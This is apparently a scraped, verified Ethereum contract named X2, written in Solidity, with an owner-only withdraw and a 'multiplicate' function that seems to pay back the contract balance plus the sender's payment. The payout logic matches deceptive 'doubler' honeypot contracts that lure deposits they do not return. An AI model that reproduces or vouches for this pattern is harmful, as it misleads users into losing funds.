
//Address: 0xE0527863dF8abcb3caCA7dA329eb9C747822Aa98
//Contract name: X2
//Balance: 0 Ether
//Verification Date: 2/13/2018
//Transacion Count: 4

// CODE STARTS HERE

contract X2
{
        address public Owner = msg.sender;

        function() public payable{}

        function withdraw()  payable public
        {
                require(msg.sender == Owner);
                Owner.transfer(this.balance);
        }

        function multiplicate(address adr) public payable
        {
            if(msg.value>=this.balance)
            {
                adr.transfer(this.balance+msg.value);
            }
        }


}
